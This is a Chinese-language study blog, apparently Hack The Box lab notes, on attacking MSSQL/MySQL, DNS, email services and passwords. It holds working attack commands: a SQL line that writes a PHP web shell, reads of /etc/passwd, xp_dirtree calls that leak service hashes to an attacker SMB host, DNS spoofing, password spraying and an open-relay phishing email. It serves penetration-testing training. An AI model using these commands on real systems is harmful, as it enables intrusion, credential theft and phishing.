GO</code></pre><p>如果没有启用xp_cmdshell，如果我们有适当的权限，我们可以使用以下命令启用它：</p><pre><code class="mssql">-- To allow advanced options to be changed.  EXECUTE sp_configure &#39;show advanced options&#39;, 1GO-- To update the currently configured value for advanced options.  RECONFIGUREGO  -- To enable the feature.  EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1GO  -- To update the currently configured value for this feature.  RECONFIGUREGO</code></pre><p>MySQL支持用户定义函数，这允许我们在SQL中作为函数执行C&#x2F;C++代码，在这个GitHub存储库 <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>中有一个用于命令执行的用户定义函数。在生产环境中遇到这样的用户定义函数并不常见，但我们应该意识到，我们可能能够使用它</p><h2 id="Write-Local-Files"><a href="#Write-Local-Files" class="headerlink" title="Write Local Files"></a>Write Local Files</h2><p>如果我们有适当的权限，我们可以尝试在web服务器目录中使用SELECT INTO OUTFILE编写文件。然后我们可以浏览到文件所在的位置并执行我们的命令。</p><pre><code class="shell-session">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;Query OK, 1 row affected (0.001 sec)</code></pre><p>在MySQL中，全局系统变量secure_file_priv限制了数据导入和导出操作的效果，例如由LOAD data和SELECT…INTO OUTFILE语句以及LOAD_file（）函数执行的操作。这些操作只允许具有FILE权限的用户执行。</p><pre><code class="shell-session">mysql&gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name    | Value |+------------------+-------+| secure_file_priv |       |+------------------+-------+</code></pre><p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p><h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></pre><h2 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h2><p>在攻击SMB部分，我们讨论了我们可以创建一个假的SMB服务器来窃取哈希并在Windows操作系统中滥用一些默认实现。我们还可以使用xp_subdirs或xp_dirtree未记录的存储过程窃取MSSQL服务帐户哈希，这些存储过程使用SMB协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向SMB服务器时，目录侦听功能将强制服务器进行身份验证并发送运行SQL server的服务帐户的NTLMv2哈希。 为了实现这一点，我们需要首先启动Responder或impacket-smbserver，并执行以下SQL查询之一：</p><h4 id="XP-DIRTREE-Hash-Stealing"><a href="#XP-DIRTREE-Hash-Stealing" class="headerlink" title="XP_DIRTREE Hash Stealing"></a>XP_DIRTREE Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h4 id="XP-SUBDIRS-Hash-Stealing"><a href="#XP-SUBDIRS-Hash-Stealing" class="headerlink" title="XP_SUBDIRS Hash Stealing"></a>XP_SUBDIRS Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>What is the password for the “mssqlsvc” user?</p></blockquote><p>这里尝试了用给到的字典进行爆破，发现不可行，反复阅读文案后发现可以导出hash：</p><p>先监听</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122043562.png" alt="image-20230812204234008"></p><p>然后执行查询语句弹回hash</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308161515067.png" alt="image-20230812204400386"></p><p>然后破解hash即可</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122050713.png" alt="image-20230812205036653"></p><h1 id="Attacking-DNS"><a href="#Attacking-DNS" class="headerlink" title="Attacking DNS"></a>Attacking DNS</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDTNmap scan report for 10.10.110.213Host is up (0.017s latency).PORT    STATE  SERVICE     VERSION53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</code></pre><p>DNS区域是特定组织或管理员管理的DNS命名空间的一部分。由于DNS包括多个DNS区域，DNS服务器利用DNS区域传输将其数据库的一部分复制到另一个DNS服务器。除非DNS服务器配置正确（限制哪些IP可以执行DNS区域传输），否则任何人都可以向DNS服务器索取其区域信息的副本，因为DNS区域传输不需要任何身份验证。此外，DNS服务通常在UDP端口上运行；然而，在执行DNS区域传输时，它使用TCP端口进行可靠的数据传输。 攻击者可以利用此DNS区域传输漏洞来了解有关目标组织的DNS命名空间的更多信息，从而增加攻击面。为了利用此漏洞，我们可以使用带有DNS查询类型AXFR选项的dig实用程序从易受攻击的DNS服务器中转储整个DNS命名空间：</p><pre><code class="shell-session">Tanin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213;; global options: +cmdinlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800inlanefrieght.htb.         604800  IN      AAAA    ::1inlanefrieght.htb.         604800  IN      NS      localhost.inlanefrieght.htb.         604800  IN      A       10.129.110.22admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25support.inlanefrieght.htb. 604800  IN      A       10.129.110.28inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 28 msec;; SERVER: 10.129.110.213#53(10.129.110.213);; WHEN: Mon Oct 11 17:20:13 EDT 2020;; XFR size: 8 records (messages 1, bytes 289)</code></pre><p>像 <a href="https://github.com/mschwager/fierce">Fierce</a>这样的工具也可以用来枚举根域的所有DNS服务器，并扫描DNS区域传输：</p><pre><code class="shell-session">Tanin@htb[/htb]# fierce --domain zonetransfer.me</code></pre><h2 id="Domain-Takeovers-amp-Subdomain-Enumeration"><a href="#Domain-Takeovers-amp-Subdomain-Enumeration" class="headerlink" title="Domain Takeovers &amp; Subdomain Enumeration"></a>Domain Takeovers &amp; Subdomain Enumeration</h2><p>在执行子域接管之前，我们应该使用<a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>等工具枚举目标域的子域。这个工具可以从像 <a href="https://dnsdumpster.com/">DNSdumpster</a>这样的开放源代码中抓取子域。<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等其他工具也可以通过提供预先生成的单词列表来使用暴力子域：</p><pre><code class="shell-session">Tanin@htb[/htb]# ./subfinder -d inlanefreight.com -v                                                                                      _     __ _         _                                           ____  _| |__ / _(_)_ _  __| |___ _ _          (_-&lt; || | &#39;_ \  _| | &#39; \/ _  / -_) &#39;_|                 /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                                 projectdiscovery.io                                                                                           [WRN] Use with caution. You are responsible for your actions[WRN] Developers assume no liability and are not responsible for any misuse or damage.[WRN] By using subfinder, you also agree to the terms of the APIs used.                                    [INF] Enumerating subdomains for inlanefreight.com[alienvault] www.inlanefreight.com[dnsdumpster] ns1.inlanefreight.com[dnsdumpster] ns2.inlanefreight.com...snip...[bufferover] Source took 2.193235338s for enumerationns2.inlanefreight.comwww.inlanefreight.comns1.inlanefreight.comsupport.inlanefreight.com[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds</code></pre><p>一个很好的替代方案是一种名为<a href="https://github.com/TheRook/subbrute">Subbrute</a>的工具。该工具允许我们使用自定义解析器，并在无法访问Internet的主机上进行内部渗透测试时执行纯DNS暴力攻击。</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1Tanin@htb[/htb]$ cd subbruteTanin@htb[/htb]$ echo &quot;ns1.inlanefreight.com&quot; &gt; ./resolvers.txtTanin@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt</code></pre><p>有时内部物理配置的安全性很差，我们可以利用它从U盘上传工具。另一种情况是，我们已经通过转向到达了一个内部主机，并希望在那里工作。当然，还有其他选择，但知道其他方式和可能性并没有坏处。 该工具发现了四个与inlanefreight.com相关的子域。使用nslookup或host命令，我们可以枚举这些子域的CNAME记录。</p><pre><code class="shell-session">Tanin@htb[/htb]# host support.inlanefreight.comsupport.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com</code></pre><p>支持子域有一个指向AWS S3存储桶的别名记录。但是，URL<a href="https://support.inlanefreight.com显示了一个nosuchbucket错误,表明子域可能容易受到子域接管的攻击.现在,我们可以通过创建一个具有相同子域名称的aws/">https://support.inlanefreight.com显示了一个NoSuchBucket错误，表明子域可能容易受到子域接管的攻击。现在，我们可以通过创建一个具有相同子域名称的AWS</a> S3 bucket来接管子域。</p><p> <a href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a>存储库也是子域接管漏洞的绝佳参考。它显示了目标服务是否易受子域接管的攻击，并提供了评估漏洞的指导方针。</p><h4 id="Local-DNS-Cache-Poisoning"><a href="#Local-DNS-Cache-Poisoning" class="headerlink" title="Local DNS Cache Poisoning"></a>Local DNS Cache Poisoning</h4><p>从本地网络的角度来看，攻击者还可以使用 <a href="https://www.ettercap-project.org/">Ettercap</a> 或<a href="https://www.bettercap.org/">Bettercap</a>等MITM工具执行DNS缓存中毒。 要通过Ettercap利用DNS缓存中毒，我们应该首先编辑&#x2F;etc&#x2F;Ettercap&#x2F;etter.DNS文件，以映射他们想要欺骗的目标域名（例如，inlanefreight.com）和他们想要将用户重定向到的攻击者的IP地址（例如，192.168.225.110）：</p><pre><code class="shell-session">Tanin@htb[/htb]# cat /etc/ettercap/etter.dnsinlanefreight.com      A   192.168.225.110*.inlanefreight.com    A   192.168.225.110</code></pre><p>接下来，启动Ettercap工具，并通过导航到主机&gt;扫描主机来扫描网络中的活动主机。完成后，将目标IP地址（例如192.168.152.129）添加到Target1，并将默认网关IP（例如192.168.152.2）添加到Target2。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743246.png" alt="img"></p><p>通过导航到插件&gt;管理插件来激活dns_恶搞攻击。这将向目标计算机发送假DNS响应，该响应将解析inlanefreight.com到IP地址192.168.225.110：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743982.png" alt="img"></p><p>成功的DNS欺骗攻击后，如果来自目标机器192.168.152.129的受害者用户在web浏览器上访问inlanefreight.com域，他们将被重定向到IP地址192.168.225.110上的虚假页面，此外，从目标IP地址192.168.152.129到inlanefreight.com的ping也应解析为192.168.225.110：</p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Find all available DNS records for the “inlanefreight.htb” domain on the target name server and submit the flag found as a DNS record as the answer.</p></blockquote><h1 id="Attacking-Email-Services"><a href="#Attacking-Email-Services" class="headerlink" title="Attacking Email Services"></a>Attacking Email Services</h1><p>邮件服务器（有时也称为电子邮件服务器）是一种通过网络（通常是通过互联网）处理和发送电子邮件的服务器。邮件服务器可以从客户端设备接收电子邮件并将其发送到其他邮件服务器。邮件服务器还可以向客户端设备发送电子邮件。客户端通常是我们阅读电子邮件的设备（电脑、智能手机等）。 当我们按下电子邮件应用程序（电子邮件客户端）中的“发送”按钮时，该程序将建立与网络或Internet上SMTP服务器的连接。SMTP这个名称代表简单邮件传输协议，它是一种将电子邮件从客户端传递到服务器以及从服务器传递到其他服务器的协议。 当我们将电子邮件下载到电子邮件应用程序时，它将连接到互联网上的POP3或IMAP4服务器，这允许用户将邮件保存在服务器邮箱中并定期下载。 默认情况下，POP3客户端会从电子邮件服务器中删除下载的邮件。这种行为使得在多个设备上访问电子邮件变得困难，因为下载的邮件存储在本地计算机上。但是，我们通常可以将POP3客户端配置为在服务器上保留下载邮件的副本。 另一方面，默认情况下，IMAP4客户端不会从电子邮件服务器中删除下载的邮件。此行为使从多个设备访问电子邮件变得容易。让我们看看如何针对邮件服务器。</p><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>电子邮件服务器很复杂，通常需要我们枚举多个服务器、端口和服务。此外，如今大多数公司的电子邮件服务都在云端，并提供 <a href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a>或 <a href="https://workspace.google.com/solutions/new-business/">G-Suite</a>等服务。因此，我们攻击电子邮件服务的方法取决于所使用的服务。 我们可以使用邮件交换（MX）DNS记录来识别邮件服务器。MX记录指定负责代表域名接受电子邮件的邮件服务器。可以配置几个MX记录，通常指向一个邮件服务器阵列以实现负载平衡和冗余。 我们可以使用主机或挖掘等工具以及<a href="https://mxtoolbox.com/">MXToolbox</a>等在线网站来查询有关MX记录的信息</p><h4 id="Host-MX-Records"><a href="#Host-MX-Records" class="headerlink" title="Host - MX Records"></a>Host - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX hackthebox.euhackthebox.eu mail is handled by 1 aspmx.l.google.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX microsoft.commicrosoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.</code></pre><h4 id="DIG-MX-Records"><a href="#DIG-MX-Records" class="headerlink" title="DIG - MX Records"></a>DIG - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx plaintext.do | grep &quot;MX&quot; | grep -v &quot;;&quot;plaintext.do.           7076    IN      MX      50 mx3.zoho.com.plaintext.do.           7076    IN      MX      10 mx.zoho.com.plaintext.do.           7076    IN      MX      20 mx2.zoho.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.</code></pre><h4 id="DIG-A-Record-for-MX"><a href="#DIG-A-Record-for-MX" class="headerlink" title="DIG - A Record for MX"></a>DIG - A Record for MX</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t A mail1.inlanefreight.htb.mail1.inlanefreight.htb has address 10.129.14.128</code></pre><p>这些MX记录表明，前三个邮件服务使用的是云服务G-Suite（aspmx.l.google.com）、Microsoft 365（Microsoft.com.mail.protection.outlook.com）和Zoho（MX.Zoho.com），最后一个可能是该公司托管的自定义邮件服务器。 此信息至关重要，因为枚举方法可能因服务而异。例如，大多数云服务提供商使用他们的邮件服务器实现，并采用现代身份验证，这为每个服务提供商打开了新的、唯一的攻击向量。另一方面，如果公司配置服务，我们可能会发现允许对邮件服务器协议进行常见攻击的不良做法和错误配置。 如果我们的目标是一个自定义邮件服务器实现，如inlanefreight.htb，我们可以列举以下端口：</p><table><thead><tr><th><code>TCP/25</code></th><th>SMTP Unencrypted</th></tr></thead><tbody><tr><td><code>TCP/143</code></td><td>IMAP4 Unencrypted</td></tr><tr><td><code>TCP/110</code></td><td>POP3 Unencrypted</td></tr><tr><td><code>TCP/465</code></td><td>SMTP Encrypted</td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 Encrypted</td></tr><tr><td><code>TCP/995</code></td><td>POP3 Encrypted</td></tr></tbody></table><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128</code></pre><h2 id="Misconfigurations"><a href="#Misconfigurations" class="headerlink" title="Misconfigurations"></a>Misconfigurations</h2><p>电子邮件服务使用身份验证来允许用户发送电子邮件和接收电子邮件。当SMTP服务允许匿名身份验证或支持可用于枚举有效用户名的协议时，可能会发生配置错误。</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>SMTP服务器有不同的命令，可用于枚举有效用户名VRFY、EXPN和RCPT to。如果我们成功枚举有效用户名，我们可以尝试密码喷洒、暴力破解或猜测有效密码。因此，让我们探究一下这些命令是如何工作的。</p><h4 id="VRFY-Command"><a href="#VRFY-Command" class="headerlink" title="VRFY Command"></a>VRFY Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)VRFY root252 2.0.0 rootVRFY www-data252 2.0.0 www-dataVRFY new-user550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table</code></pre><p>EXPN与VRFY类似，只是当与通讯组列表一起使用时，它会列出该列表中的所有用户。这可能是一个比VRFY命令更大的问题，因为站点通常有一个别名，如“all”</p><h4 id="EXPN-Command"><a href="#EXPN-Command" class="headerlink" title="EXPN Command"></a>EXPN Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)EXPN john250 2.1.0 john@inlanefreight.htbEXPN support-team250 2.0.0 carol@inlanefreight.htb250 2.1.5 elisa@inlanefreight.htb</code></pre><p>RCPT TO标识电子邮件的收件人。对于给定的邮件，可以多次重复此命令，以便将单个邮件传递给多个收件人。</p><h4 id="RCPT-TO-Command"><a href="#RCPT-TO-Command" class="headerlink" title="RCPT TO Command"></a>RCPT TO Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)MAIL FROM:test@htb.comit is250 2.1.0 test@htb.com... Sender okRCPT TO:julio550 5.1.1 julio... User unknownRCPT TO:kate550 5.1.1 kate... User unknownRCPT TO:john250 2.1.5 john... Recipient ok</code></pre><p>我们还可以根据服务实现使用POP3协议来枚举用户。例如，我们可以使用USER命令和用户名，如果服务器的响应为OK，这意味着用户存在于服务器上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 110Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.+OK POP3 Server readyUSER julio-ERRUSER john+OK</code></pre><p>为了自动化我们的枚举过程，我们可以使用一个名为 <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>的工具。我们可以用后面跟着VRFY、EXPN或RCPT的参数-M指定枚举模式，用包含要枚举的用户列表的文件指定参数-U。根据服务器实现和枚举模式，我们需要添加带有参数-D的电子邮件地址的域。最后，我们用参数-t指定目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></pre><h2 id="Cloud-Enumeration"><a href="#Cloud-Enumeration" class="headerlink" title="Cloud Enumeration"></a>Cloud Enumeration</h2><p>如前所述，云服务提供商使用自己的电子邮件服务实现。这些服务通常具有自定义功能，我们可以滥用这些功能进行操作，例如用户名枚举。让我们以Office365为例，探讨如何在此云平台中枚举用户名。 <a href="https://github.com/0xZDH/o365spray">O365spray</a>是<a href="https://twitter.com/0xzdh">ZDH</a>开发的一款针对Microsoft Office 365（O365）的用户名枚举和密码喷涂工具。该工具重新实现了鸣谢中<a href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>提到的人员研究和确定的列举和喷涂技术的集合。让我们首先验证我们的目标域是否正在使用Office 365。</p><h4 id="O365-Spray"><a href="#O365-Spray" class="headerlink" title="O365 Spray"></a>O365 Spray</h4><pre><code class="shell-session">python3 o365spray.py --validate --domain msplaintext.xyz</code></pre><p>validate:验证</p><p>现在，我们可以尝试识别用户名。</p><pre><code class="shell-session"> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   </code></pre><h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><p>我们可以使用Hydra对SMTP、POP3或IMAP4等电子邮件服务执行密码喷洒或暴力攻击。首先，我们需要获得用户名列表和密码列表，并指定要攻击的服务。让我们看看POP3的示例。</p><pre><code class="shell-session">hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></pre><p>如果云服务支持SMTP、POP3或IMAP4协议，我们可能可以尝试使用Hydra等工具执行密码喷洒，但这些工具通常会被阻止。相反，我们可以尝试使用自定义工具，如适用于Microsoft Office 365的 <a href="https://github.com/0xZDH/o365spray">o365spray</a>或<a href="https://github.com/dafthack/MailSniper">MailSniper</a>，或适用于Gmail或Okta的 <a href="https://github.com/ustayready/CredKing">CredKing</a>。请记住，这些工具需要是最新的，因为如果服务提供商更改某些内容（这种情况经常发生），这些工具可能就无法再工作了。这是一个完美的例子，说明了为什么我们必须了解我们的工具在做什么，并拥有在它们因某种原因无法正常工作时对其进行修改的专业知识。</p><h4 id="O365-Spray-Password-Spraying"><a href="#O365-Spray-Password-Spraying" class="headerlink" title="O365 Spray - Password Spraying"></a>O365 Spray - Password Spraying</h4><pre><code class="shell-session"> python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></pre><h2 id="Protocol-Specifics-Attacks"><a href="#Protocol-Specifics-Attacks" class="headerlink" title="Protocol Specifics Attacks"></a>Protocol Specifics Attacks</h2><p>开放中继是简单传输邮件协议（SMTP）服务器，该服务器配置不正确，允许未经身份验证的电子邮件中继。意外或有意配置为开放中继的消息服务器允许来自任何来源的邮件通过开放中继服务器透明地重新路由。这种行为屏蔽了消息的来源，使其看起来像是来自开放中继服务器的邮件。</p><h4 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h4><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</code></pre><p>接下来，我们可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p><pre><code class="shell-session">Tanin@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Company Notification&#39; --body &#39;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#39; --server 10.10.11.213</code></pre><pre><code class="shell-session">=== Trying 10.10.11.213:25...=== Connected to 10.10.11.213.&lt;-  220 mail.localdomain SMTP Mailer ready -&gt; EHLO parrot&lt;-  250-mail.localdomain&lt;-  250-SIZE 33554432&lt;-  250-8BITMIME&lt;-  250-STARTTLS&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1&lt;-  250 HELP -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;&lt;-  250 OK -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;&lt;-  250 OK -&gt; DATA&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400 -&gt; To: employees@inlanefreight.com -&gt; From: notifications@inlanefreight.com -&gt; Subject: Company Notification -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt; -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -&gt;  -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/ -&gt;  -&gt;  -&gt; .&lt;-  250 OK -&gt; QUIT&lt;-  221 Bye=== Connection closed with remote host.</code></pre><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>这里先用检测一下是否使用o365服务（后来仔细看发先这是检测云服务的，应该没有必要）：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201558544.png" alt="image-20230820155755455"></p><p>看来没有启用，使用常规方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201604202.png" alt="image-20230820160410150"></p><p>这里域名-D看样子是值邮件的后缀</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201614934.png" alt="image-20230820161403882"></p><p>用户名是带域名的，然后登录不知道怎么办，无论如何不给过</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201653370.png" alt="image-20230820165359316"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Attacking-FTP&quot;&gt;&lt;a href=&quot;#Attacking-FTP&quot; class=&quot;headerlink&quot; title=&quot;Attacking FTP&quot;&gt;&lt;/a&gt;Attacking FTP&lt;/h1&gt;&lt;h4 id=&quot;Brute-Forcing&quot;&gt;&lt;a href=&quot;#Brute-Forcing&quot; class=&quot;headerlink&quot; title=&quot;Brute Forcing&quot;&gt;&lt;/a&gt;Brute Forcing&lt;/h4&gt;&lt;p&gt; &lt;a href=&quot;https://github.com/jmk-foofus/medusa&quot;&gt;Medusa&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Passwrod_Attack</title>
    <link href="https://taninluv.github.io/2023/07/20/Passwrod-Attack/"/>
    <id>https://taninluv.github.io/2023/07/20/Passwrod-Attack/</id>
    <published>2023-07-20T09:11:45.000Z</published>
    <updated>2023-08-01T04:16:10.131Z</updated>
    
    <content type="html"><![CDATA[<p>在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户</p><span id="more"></span><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这里引入了一个新工具攻击各种基于windows的协议：</p><pre><code class="shell-session">Tanin@htb[/htb]$  crackmapexec -hoptional arguments:  -h, --help            show this help message and exit  -t THREADS            set how many concurrent threads to use (default: 100)  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)  --jitter INTERVAL     sets a random delay between each connection (default: None)  --darrell             give Darrell a hand  --verbose             enable verbose outputprotocols:  available protocols  &#123;mssql,smb,ssh,winrm&#125;    mssql               own stuff using MSSQL    smb                 own stuff using SMB    ssh                 own stuff using SSH    winrm               own stuff using WINRM</code></pre><p>针对某种协议的用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb -h</code></pre><p>通用的语法大致如下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;</code></pre><h4 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h4><p>这里还提到了一个专门针对WinRM的工具 <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo gem install evil-winrm</code></pre><p>基本用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ evil-winrm -i &lt;target-IP&gt; -u &lt;username&gt; -p &lt;password&gt;</code></pre><p>直接上练习：</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:10.129.202.136</p><ul><li>查找WinRM服务的用户并破解其密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到SSH服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到RDP服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>查找SMB服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li></ul></blockquote><p>这里纯属爆破比较无聊，而且vpn比较慢，直接学下一节吧。</p><h1 id="Password-Mutations"><a href="#Password-Mutations" class="headerlink" title="Password Mutations"></a>Password Mutations</h1><p>他给了一篇博客，是关于密码的<a href="https://wpengine.com/resources/passwords-unmasked-infographic/">WPengine</a></p><p>顺带再放一个hashcat的规则集方便查找：<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">documentation</a></p><h4 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a><a href="https://github.com/digininja/CeWL">CeWL</a></h4><p>我们现在可以使用另一个名为CeWL的工具来扫描公司网站上的潜在单词，并将其保存在单独的列表中。然后，我们可以将该列表与所需规则相结合，创建一个自定义的密码列表，该列表猜测正确密码的概率更高。我们指定了一些参数，如spider的深度（-d）、单词的最小长度（-m）、找到的单词的小写存储（–lower），以及我们想要存储结果的文件（-w）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用本节右上角“资源”下ZIP文件中的文件创建一个变异单词列表。使用此单词列表可以强制爆破用户“sam”的密码。成功后，使用SSH登录并提交flag.txt文件的内容作为您的答案。</p></blockquote><p>这里它给了一个文件里面有一个密码本和用户列表和一个规则集，上一题应该用这个文档能轻松爆破。。。</p><p>这里要做什么也很清楚，但是发现hydra不能直接使用-r了：</p><p><img 